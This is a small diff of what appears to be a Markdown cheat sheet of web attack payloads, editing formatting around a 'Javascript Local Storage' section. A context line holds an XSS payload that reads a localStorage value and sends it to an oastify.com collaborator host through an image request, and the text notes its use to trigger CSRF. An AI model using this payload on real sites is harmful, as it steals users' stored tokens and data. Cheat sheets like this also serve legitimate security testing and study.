@@ -55,10 +55,8 @@ ws.onmessage = function (evt) {
 ```
 ### [[Javascript Local Storage]]
 ```
-```
 <script>var i=new Image;i.src="http://...oastify.com/?"+localStorage.getItem("keyname");</script>
 ```
-### [[Cross Site Request Forgery|CSRF]]
 Can be uesd to trigger [[Cross Site Request Forgery|CSRF]]
 ### Redirect Link
 ```
